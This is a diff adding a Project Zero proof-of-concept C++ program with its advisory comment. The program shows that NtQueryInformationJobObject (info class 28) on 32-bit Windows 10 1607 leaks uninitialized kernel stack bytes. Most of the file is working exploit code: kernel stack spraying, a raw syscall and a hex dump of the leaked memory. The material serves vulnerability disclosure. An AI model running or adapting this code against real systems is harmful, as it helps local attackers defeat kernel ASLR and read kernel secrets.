@@ -1,0 +1,112 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1194
+
+We have discovered that the nt!NtQueryInformationJobObject system call (corresponding to the documented QueryInformationJobObject() API function) called with the 28 information class discloses portions of uninitialized kernel stack memory to user-mode clients.
+
+The specific name of the 28 information class or the layout of the corresponding output buffer are unknown to us; however, we have determined that on Windows 10 1607 32-bit, an output size of 40 bytes is accepted. At the end of that memory area, 16 uninitialized bytes from the kernel stack are leaked to the client application.
+
+The attached proof-of-concept program demonstrates the disclosure by spraying the kernel stack with a large number of 0x41 ('A') marker bytes, and then calling the affected system call with infoclass=28 and the allowed output size. An example output is as follows:
+
+--- cut ---
+00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000010: 00 00 00 00 00 00 00 00 41 41 41 41 41 41 41 41 ........AAAAAAAA
+00000020: 41 41 41 41 41 41 41 41 ?? ?? ?? ?? ?? ?? ?? ?? AAAAAAAA........
+--- cut ---
+
+It is clearly visible here that 16 bytes copied from ring-0 to ring-3 remained uninitialized. If the stack spraying function call is commented out, raw kernel pointers can be observed in the output.
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <cstdio>
+
+extern "C"
+ULONG WINAPI NtMapUserPhysicalPages(
+    PVOID BaseAddress,
+    ULONG NumberOfPages,
+    PULONG PageFrameNumbers
+);
+
+// For native 32-bit execution.
+extern "C"
+ULONG CDECL SystemCall32(DWORD ApiNumber, ...) {
+  __asm{mov eax, ApiNumber};
+  __asm{lea edx, ApiNumber + 4};
+  __asm{int 0x2e};
+}
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {
+  for (ULONG i = 0; i < size; i++) {
+    ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  // Buffer allocated in static program memory, hence doesn't touch the local stack.
+  static BYTE buffer[4096];
+
+  // Fill the buffer with 'A's and spray the kernel stack.
+  MyMemset(buffer, 'A', sizeof(buffer));
+  NtMapUserPhysicalPages(buffer, sizeof(buffer) / sizeof(DWORD), (PULONG)buffer);
+
+  // Make sure that we're really not touching any user-mode stack by overwriting the buffer with 'B's.
+  MyMemset(buffer, 'B', sizeof(buffer));
+}
+
+int main() {
+  // Windows 10 1607 32-bit.
+  CONST ULONG __NR_NtQueryInformationJobObject = 0x00b9;
+
+  // Create a job object to operate on.
+  HANDLE hJob = CreateJobObject(NULL, NULL);
+
+  // Spray the kernel stack with a marker value, to get visible results.
+  SprayKernelStack();
+
+  // Trigger the bug in nt!NtQueryInformationJobObject(class 28, output length 40).
+  DWORD ReturnLength = 0;
+  BYTE output[40] = { /* zero padding */ };
+
+  NTSTATUS st = SystemCall32(__NR_NtQueryInformationJobObject, hJob, 28, output, sizeof(output), &ReturnLength);
+  if (!NT_SUCCESS(st)) {
+    printf("NtQueryInformationJobObject failed, %x\n", st);
+    CloseHandle(hJob);
+    return 1;
+  }
+
+  // Print out the output.
+  PrintHex(output, ReturnLength);
+
+  // Free resources.
+  CloseHandle(hJob);
+
+  return 0;
+}
